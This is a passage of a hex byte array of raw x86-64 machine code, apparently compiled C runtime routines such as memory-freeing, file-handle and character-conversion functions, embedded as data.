0xeb, 0xb1, 0xff, 0x15, 0x55, 0x30, 0x0, 0x0, 0x89, 0x45, 0xd0, 0xe9, 0xbd, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x4d, 0x8b, 0xc6, 0x48, 0x8d, 0x4d, 0xd0, 0x41, 0x8b, 0xd4, 0xe8, 0xea, 0xf4, 0xff, 0xff, 0xf2, 0xf, 0x10, 0x0, 0x8b, 0x78, 0x8, 0xe9, 0x9f, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0x5f, 0xe2, 0x0, 0x0, 0x49, 0x8b, 0xc, 0xd0, 0x42, 0x38, 0x7c, 0xe9, 0x38, 0x7d, 0x51, 0x8b, 0xce, 0x40, 0x84, 0xf6, 0x74, 0x36, 0x83, 0xe9, 0x1, 0x74, 0x1d, 0x83, 0xf9, 0x1, 0xf, 0x85, 0x84, 0x0, 0x0, 0x0, 0x45, 0x8b, 0xcf, 0x48, 0x8d, 0x4d, 0xd0, 0x4d, 0x8b, 0xc6, 0x41, 0x8b, 0xd4, 0xe8, 0x31, 0xfa, 0xff, 0xff, 0xeb, 0xb5, 0x45, 0x8b, 0xcf, 0x48, 0x8d, 0x4d, 0xd0, 0x4d, 0x8b, 0xc6, 0x41, 0x8b, 0xd4, 0xe8, 0x39, 0xfb, 0xff, 0xff, 0xeb, 0xa1, 0x45, 0x8b, 0xcf, 0x48, 0x8d, 0x4d, 0xd0, 0x4d, 0x8b, 0xc6, 0x41, 0x8b, 0xd4, 0xe8, 0x5, 0xf9, 0xff, 0xff, 0xeb, 0x8d, 0x4a, 0x8b, 0x4c, 0xe9, 0x28, 0x4c, 0x8d, 0x4d, 0xd4, 0x33, 0xc0, 0x45, 0x8b, 0xc7, 0x48, 0x21, 0x44, 0x24, 0x20, 0x49, 0x8b, 0xd6, 0x48, 0x89, 0x45, 0xd0, 0x89, 0x45, 0xd8, 0xff, 0x15, 0x28, 0x31, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x9, 0xff, 0x15, 0x96, 0x2f, 0x0, 0x0, 0x89, 0x45, 0xd0, 0x8b, 0x7d, 0xd8, 0xf2, 0xf, 0x10, 0x45, 0xd0, 0xf2, 0xf, 0x11, 0x45, 0xe0, 0x48, 0x8b, 0x55, 0xc8, 0x4c, 0x8d, 0x5, 0xbb, 0xe1, 0x0, 0x0, 0x48, 0x8b, 0x45, 0xe0, 0x48, 0xc1, 0xe8, 0x20, 0x85, 0xc0, 0x75, 0x5d, 0x8b, 0x45, 0xe0, 0x85, 0xc0, 0x74, 0x2c, 0x83, 0xf8, 0x5, 0x75, 0x17, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x9, 0x0, 0x0, 0x0, 0xc6, 0x43, 0x38, 0x1, 0x89, 0x43, 0x34, 0xe9, 0xa3, 0xfd, 0xff, 0xff, 0x8b, 0x4d, 0xe0, 0x48, 0x8b, 0xd3, 0xe8, 0x95, 0xa9, 0xff, 0xff, 0xe9, 0x93, 0xfd, 0xff, 0xff, 0x49, 0x8b, 0x4, 0xd0, 0x42, 0xf6, 0x44, 0xe8, 0x38, 0x40, 0x74, 0x6, 0x41, 0x80, 0x3e, 0x1a, 0x74, 0x1f, 0x83, 0x63, 0x34, 0x0, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x1c, 0x0, 0x0, 0x0, 0xc6, 0x43, 0x38, 0x1, 0xe9, 0x69, 0xfd, 0xff, 0xff, 0x8b, 0x45, 0xe4, 0x2b, 0xc7, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x68, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x30, 0x83, 0x64, 0x24, 0x20, 0x0, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0x7, 0xa4, 0xff, 0xff, 0x90, 0xbb, 0x3, 0x0, 0x0, 0x0, 0x89, 0x5c, 0x24, 0x24, 0x3b, 0x1d, 0x4f, 0xe5, 0x0, 0x0, 0x74, 0x6d, 0x48, 0x63, 0xfb, 0x48, 0x8b, 0x5, 0x4b, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf8, 0x48, 0x85, 0xc9, 0x75, 0x2, 0xeb, 0x54, 0x8b, 0x41, 0x14, 0xc1, 0xe8, 0xd, 0x24, 0x1, 0x74, 0x19, 0x48, 0x8b, 0xd, 0x2f, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf9, 0xe8, 0x12, 0x8, 0x0, 0x0, 0x83, 0xf8, 0xff, 0x74, 0x4, 0xff, 0x44, 0x24, 0x20, 0x48, 0x8b, 0x5, 0x16, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf8, 0x48, 0x83, 0xc1, 0x30, 0xff, 0x15, 0xa0, 0x2e, 0x0, 0x0, 0x48, 0x8b, 0xd, 0x1, 0xe5, 0x0, 0x0, 0x48, 0x8b, 0xc, 0xf9, 0xe8, 0xa0, 0xa9, 0xff, 0xff, 0x48, 0x8b, 0x5, 0xf1, 0xe4, 0x0, 0x0, 0x48, 0x83, 0x24, 0xf8, 0x0, 0xff, 0xc3, 0xeb, 0x87, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0xd2, 0xa3, 0xff, 0xff, 0x8b, 0x44, 0x24, 0x20, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x41, 0x14, 0x48, 0x8b, 0xd9, 0xc1, 0xe8, 0xd, 0xa8, 0x1, 0x74, 0x27, 0x8b, 0x41, 0x14, 0xc1, 0xe8, 0x6, 0xa8, 0x1, 0x74, 0x1d, 0x48, 0x8b, 0x49, 0x8, 0xe8, 0x4e, 0xa9, 0xff, 0xff, 0xf0, 0x81, 0x63, 0x14, 0xbf, 0xfe, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x89, 0x43, 0x8, 0x48, 0x89, 0x3, 0x89, 0x43, 0x10, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x83, 0xf9, 0xfe, 0x75, 0xd, 0xe8, 0x8e, 0xa8, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xeb, 0x42, 0x85, 0xc9, 0x78, 0x2e, 0x3b, 0xd, 0x24, 0xe4, 0x0, 0x0, 0x73, 0x26, 0x48, 0x63, 0xc9, 0x48, 0x8d, 0x15, 0x18, 0xe0, 0x0, 0x0, 0x48, 0x8b, 0xc1, 0x83, 0xe1, 0x3f, 0x48, 0xc1, 0xe8, 0x6, 0x48, 0x8d, 0xc, 0xc9, 0x48, 0x8b, 0x4, 0xc2, 0xf, 0xb6, 0x44, 0xc8, 0x38, 0x83, 0xe0, 0x40, 0xeb, 0x12, 0xe8, 0x4f, 0xa8, 0xff, 0xff, 0xc7, 0x0, 0x9, 0x0, 0x0, 0x0, 0xe8, 0x8, 0xa7, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x5f, 0xd, 0x0, 0x0, 0x48, 0x83, 0xf8, 0x4, 0x77, 0x1a, 0x8b, 0x54, 0x24, 0x30, 0xb9, 0xfd, 0xff, 0x0, 0x0, 0x81, 0xfa, 0xff, 0xff, 0x0, 0x0, 0xf, 0x47, 0xd1, 0x48, 0x85, 0xdb, 0x74, 0x3, 0x66, 0x89, 0x13, 0x48, 0x83, 0xc4, 0x40, 0x5b, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x10, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0x3a, 0x33, 0xc0, 0x4d, 0x8b, 0xe1, 0x49, 0x8b, 0xe8, 0x4c, 0x8b, 0xfa, 0x4c, 0x8b, 0xf1, 0x48, 0x85, 0xc9, 0xf, 0x84, 0xe7, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x4d, 0x85, 0xc0, 0xf, 0x84, 0xb0, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0xac, 0x24, 0x80, 0x0, 0x0, 0x0, 0x38, 0x7, 0x75, 0x8, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x1c, 0x38, 0x47, 0x1, 0x75, 0x8, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xeb, 0xf, 0x8a, 0x47, 0x2, 0xf6, 0xd8, 0x4d, 0x1b, 0xc0, 0x49, 0xf7, 0xd8, 0x49, 0x83, 0xc0, 0x3, 0x4d, 0x8b, 0xcc, 0x4c, 0x89, 0x6c, 0x24, 0x20, 0x48, 0x8b, 0xd7, 0x48, 0x8d, 0x4c, 0x24, 0x60, 0xe8, 0xb6, 0xc, 0x0, 0x0, 0x48, 0x8b, 0xd0, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x7b, 0x33, 0xc0, 0x48, 0x85, 0xd2, 0x74, 0x6c, 0x8b, 0x4c, 0x24, 0x60, 0x81, 0xf9, 0xff, 0xff, 0x0, 0x0, 0x76, 0x3b, 0x48, 0x83, 0xfd, 0x1, 0x76, 0x49, 0x81, 0xc1, 0x0, 0x0, 0xff, 0xff, 0x41, 0xb8, 0x0, 0xd8, 0x0, 0x0, 0x8b, 0xc1, 0x89, 0x4c, 0x24, 0x60, 0xc1, 0xe8, 0xa, 0x48, 0xff, 0xcd, 0x66, 0x41, 0xb, 0xc0, 0x66, 0x89, 0x3, 0xb8, 0xff, 0x3, 0x0, 0x0, 0x66, 0x23, 0xc8, 0x48, 0x83, 0xc3, 0x2, 0xb8, 0x0, 0xdc, 0x0, 0x0, 0x66, 0xb, 0xc8, 0x33, 0xc0, 0x66, 0x89, 0xb, 0x48, 0x3, 0xfa, 0x48, 0x83, 0xc3, 0x2, 0x48, 0x83, 0xed, 0x1, 0xf, 0x85, 0x58, 0xff, 0xff, 0xff, 0x49, 0x2b, 0xde, 0x49, 0x89, 0x3f, 0x48, 0xd1, 0xfb, 0x48, 0x8b, 0xc3, 0xe9, 0x8c, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xf8, 0x66, 0x89, 0x3, 0xeb, 0xe7, 0x49, 0x89, 0x3f, 0x41, 0xc6, 0x45, 0x30, 0x1, 0x41, 0xc7, 0x45, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0xeb, 0x6e, 0x48, 0x8b, 0xac, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x38, 0x7, 0x75, 0x8, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x1c, 0x38, 0x47, 0x1, 0x75, 0x8, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xeb, 0xf, 0x8a, 0x47, 0x2, 0xf6, 0xd8, 0x4d, 0x1b, 0xc0, 0x49, 0xf7, 0xd8, 0x49, 0x83, 0xc0, 0x3, 0x4d, 0x8b, 0xcc, 0x48, 0x89, 0x6c, 0x24, 0x20, 0x48, 0x8b, 0xd7, 0x33, 0xc9, 0xe8, 0xdb, 0xb, 0x0, 0x0, 0x48, 0x83, 0xf8, 0xff, 0x74, 0x18, 0x48, 0x85, 0xc0, 0x74, 0x8e, 0x48, 0x83, 0xf8, 0x4, 0x75, 0x3, 0x48, 0xff, 0xc3, 0x48, 0x3, 0xf8, 0x48, 0xff, 0xc3, 0x33, 0xc0, 0xeb, 0xa8, 0xc6, 0x45, 0x30, 0x1, 0xc7, 0x45, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x68, 0x48, 0x8b, 0x6c, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x0, 0x1, 0x0, 0x0, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x49, 0x18, 0x48, 0x3b, 0xd, 0x18, 0xd4, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xc9, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x20, 0x48, 0x3b, 0xd, 0xe, 0xd4, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xb7, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x28, 0x48, 0x3b, 0xd, 0x4, 0xd4, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xa5, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x30, 0x48, 0x3b, 0xd, 0xfa, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x93, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x38, 0x48, 0x3b, 0xd, 0xf0, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x81, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x40, 0x48, 0x3b, 0xd, 0xe6, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x6f, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x48, 0x48, 0x3b, 0xd, 0xdc, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x5d, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x68, 0x48, 0x3b, 0xd, 0xea, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x4b, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x70, 0x48, 0x3b, 0xd, 0xe0, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x39, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x78, 0x48, 0x3b, 0xd, 0xd6, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x27, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x80, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0xc9, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x12, 0xa6, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x88, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0xbc, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xfd, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x90, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0xaf, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xe8, 0xa5, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x66, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x9, 0x48, 0x3b, 0xd, 0xf9, 0xd2, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xc2, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x8, 0x48, 0x3b, 0xd, 0xef, 0xd2, 0x0, 0x0, 0x74, 0x5, 0xe8, 0xb0, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x10, 0x48, 0x3b, 0xd, 0xe5, 0xd2, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x9e, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x58, 0x48, 0x3b, 0xd, 0x1b, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x8c, 0xa5, 0xff, 0xff, 0x48, 0x8b, 0x4b, 0x60, 0x48, 0x3b, 0xd, 0x11, 0xd3, 0x0, 0x0, 0x74, 0x5, 0xe8, 0x7a, 0xa5, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x3c, 0xd1, 0x48, 0x8b, 0xd9, 0x48, 0x3b, 0xcf, 0x74, 0x11, 0x48, 0x8b, 0xb, 0xe8, 0x56, 0xa5, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x75, 0xef, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0xf, 0x84, 0xfe, 0x0, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x56, 0x48, 0x83, 0xec, 0x20, 0xbd, 0x7, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x8b, 0xd5, 0xe8, 0xa5, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x4b, 0x38, 0x8b, 0xd5, 0xe8, 0x9a, 0xff, 0xff, 0xff, 0x8d, 0x75, 0x5, 0x8b, 0xd6, 0x48, 0x8d, 0x4b, 0x70, 0xe8, 0x8c, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0xd0, 0x0, 0x0, 0x0, 0x8b, 0xd6, 0xe8, 0x7e, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x30, 0x1, 0x0, 0x0, 0x8d, 0x55, 0xfb, 0xe8, 0x6f, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x40, 0x1, 0x0, 0x0, 0xe8, 0xd7, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x48, 0x1, 0x0, 0x0, 0xe8, 0xcb, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x50, 0x1, 0x0, 0x0, 0xe8, 0xbf, 0xa4, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x60, 0x1, 0x0, 0x0, 0x8b, 0xd5, 0xe8, 0x3d, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x98, 0x1, 0x0, 0x0, 0x8b, 0xd5, 0xe8, 0x2f, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0xd0, 0x1, 0x0, 0x0, 0x8b, 0xd6, 0xe8, 0x21, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x30, 0x2, 0x0, 0x0, 0x8b, 0xd6, 0xe8, 0x13, 0xff, 0xff, 0xff, 0x48, 0x8d, 0x8b, 0x90, 0x2, 0x0, 0x0, 0x8d, 0x55, 0xfb, 0xe8, 0x4, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xa0, 0x2, 0x0, 0x0, 0xe8, 0x6c, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xa8, 0x2, 0x0, 0x0, 0xe8, 0x60, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xb0, 0x2, 0x0, 0x0, 0xe8, 0x54, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xb8, 0x2, 0x0, 0x0, 0xe8, 0x48, 0xa4, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5e, 0xc3, 0x33, 0xc0, 0x38, 0x1, 0x74, 0xe, 0x48, 0x3b, 0xc2, 0x74, 0x9, 0x48, 0xff, 0xc0, 0x80, 0x3c, 0x8, 0x0, 0x75, 0xf2, 0xc3, 0xcc, 0xcc, 0xcc, 0x4c, 0x8b, 0xda, 0x4c, 0x8b, 0xd1, 0x4d, 0x85, 0xc0, 0x75, 0x3, 0x33, 0xc0, 0xc3, 0x41, 0xf, 0xb7, 0xa, 0x4d, 0x8d, 0x52, 0x2, 0x41, 0xf, 0xb7, 0x13, 0x4d, 0x8d, 0x5b, 0x2, 0x8d, 0x41, 0xbf, 0x83, 0xf8, 0x19, 0x44, 0x8d, 0x49, 0x20, 0x8d, 0x42, 0xbf, 0x44, 0xf, 0x47, 0xc9, 0x83, 0xf8, 0x19, 0x8d, 0x4a, 0x20, 0x41, 0x8b, 0xc1, 0xf, 0x47, 0xca, 0x2b, 0xc1, 0x75, 0xb, 0x45, 0x85, 0xc9, 0x74, 0x6, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xc4, 0xc3, 0xcc, 0x8b, 0x5, 0x56, 0xdf, 0x0, 0x0, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x63, 0xf9, 0x49, 0x8b, 0xd9, 0x8b, 0xcf, 0x41, 0x8b, 0xf0, 0x48, 0x8b, 0xea, 0xe8, 0x91, 0xeb, 0xff, 0xff, 0x48, 0x83, 0xf8, 0xff, 0x75, 0x11, 0xc6, 0x43, 0x30, 0x1, 0xc7, 0x43, 0x2c, 0x9, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc8, 0xff, 0xeb, 0x56, 0x44, 0x8b, 0xce, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd5, 0x48, 0x8b, 0xc8, 0xff, 0x15, 0xea, 0x29, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x12, 0xff, 0x15, 0x40, 0x28, 0x0, 0x0, 0x8b, 0xc8, 0x48, 0x8b, 0xd3, 0xe8, 0x8a, 0xa2, 0xff, 0xff, 0xeb, 0xd0, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x48, 0x83, 0xf8, 0xff, 0x74, 0xc5, 0x48, 0x8b, 0xd7, 0x4c, 0x8d, 0x5, 0x5f, 0xda, 0x0, 0x0, 0x83, 0xe2, 0x3f, 0x48, 0x8b, 0xcf, 0x48, 0xc1, 0xf9, 0x6, 0x48, 0x8d, 0x14, 0xd2, 0x49, 0x8b, 0xc, 0xc8, 0x80, 0x64, 0xd1, 0x38, 0xfd, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x66, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x8e, 0x9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x1f, 0x4c, 0x8d, 0x44, 0x24, 0x38, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x4c, 0x24, 0x30, 0xe8, 0xe6, 0x9, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xf, 0xb7, 0x44, 0x24, 0x30, 0xeb, 0x5, 0xb8, 0xff, 0xff, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x48, 0x8, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc9, 0x75, 0x2e, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x16, 0x0, 0x0, 0x0, 0x48, 0x89, 0x50, 0xf0, 0x48, 0x21, 0x48, 0xe8, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0xe8, 0xfd, 0x9f, 0xff, 0xff, 0x83, 0xc8, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0x8b, 0x41, 0x14, 0xc1, 0xe8, 0xc, 0x24, 0x1, 0x74, 0x7, 0xe8, 0x44, 0xc, 0x0, 0x0, 0xeb, 0xe1, 0xe8, 0x35, 0xcf, 0xff, 0xff, 0x90, 0x48, 0x8b, 0xd7, 0x48, 0x8b, 0xcb, 0xe8, 0x11, 0x0, 0x0, 0x0, 0x8b, 0xf8, 0x48, 0x8b, 0xcb, 0xe8, 0x2b, 0xcf, 0xff, 0xff, 0x8b, 0xc7, 0xeb, 0xc5, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc9, 0x75, 0x25, 0x48, 0x89, 0x50, 0xf0, 0x45, 0x33, 0xc9, 0x48, 0x21, 0x48, 0xe8, 0x45, 0x33, 0xc0, 0xc6, 0x42, 0x30, 0x1, 0xc7, 0x42, 0x2c, 0x16, 0x0, 0x0, 0x0, 0x33, 0xd2, 0xe8, 0x81, 0x9f, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xeb, 0x54, 0x8b, 0x41, 0x14, 0x83, 0xce, 0xff, 0xc1, 0xe8, 0xd, 0xa8, 0x1, 0x74, 0x3d, 0xe8, 0xe2, 0xcb, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0x8b, 0xf0, 0xe8, 0x90, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x7c, 0xd1, 0xff, 0xff, 0x8b, 0xc8, 0x48, 0x8b, 0xd7, 0xe8, 0x1e, 0xa, 0x0, 0x0, 0x85, 0xc0, 0x79, 0x5, 0x83, 0xce, 0xff, 0xeb, 0x13, 0x48, 0x8b, 0x4b, 0x28, 0x48, 0x85, 0xc9, 0x74, 0xa, 0xe8, 0xdb, 0xa1, 0xff, 0xff, 0x48, 0x83, 0x63, 0x28, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x8e, 0xb, 0x0, 0x0, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x60, 0x48, 0x83, 0x65, 0xc0, 0x0, 0x83, 0x3d, 0x16, 0xdd, 0x0, 0x0, 0x0, 0xc6, 0x45, 0xd0, 0x0, 0xc6, 0x45, 0xe8, 0x0, 0xc6, 0x45, 0xf0, 0x0, 0xc6, 0x45, 0xf8, 0x0, 0x75, 0x10, 0xf, 0x10, 0x5, 0x8d, 0xcd, 0x0, 0x0, 0xc6, 0x45, 0xe8, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xd8, 0x48, 0x8d, 0x55, 0xc0, 0xe8, 0x97, 0xfe, 0xff, 0xff, 0x80, 0x7d, 0xe8, 0x2, 0x8b, 0xf8, 0x75, 0xb, 0x48, 0x8b, 0x4d, 0xc0, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x80, 0x7d, 0xf0, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xec, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0x2e, 0x92, 0xff, 0xff, 0x89, 0x58, 0x20, 0x80, 0x7d, 0xf8, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xf4, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0x19, 0x92, 0xff, 0xff, 0x89, 0x58, 0x24, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x8b, 0xc7, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x60, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x58, 0x66, 0xf, 0x7f, 0x74, 0x24, 0x20, 0x83, 0x3d, 0xab, 0xdc, 0x0, 0x0, 0x0, 0xf, 0x85, 0xe9, 0x2, 0x0, 0x0, 0x66, 0xf, 0x28, 0xd8, 0x66, 0xf, 0x28, 0xe0, 0x66, 0xf, 0x73, 0xd3, 0x34, 0x66, 0x48, 0xf, 0x7e, 0xc0, 0x66, 0xf, 0xfb, 0x1d, 0x1f, 0x82, 0x0, 0x0, 0x66, 0xf, 0x28, 0xe8, 0x66, 0xf, 0x54, 0x2d, 0xe3, 0x81, 0x0, 0x0, 0x66, 0xf, 0x2f, 0x2d, 0xdb, 0x81, 0x0, 0x0, 0xf, 0x84, 0x85, 0x2, 0x0, 0x0, 0x66, 0xf, 0x28, 0xd0, 0xf3, 0xf, 0xe6, 0xf3, 0x66, 0xf, 0x57, 0xed, 0x66, 0xf, 0x2f, 0xc5, 0xf, 0x86, 0x2f, 0x2, 0x0, 0x0, 0x66, 0xf, 0xdb, 0x15, 0x7, 0x82, 0x0, 0x0, 0xf2, 0xf, 0x5c, 0x25, 0x8f, 0x82, 0x0, 0x0, 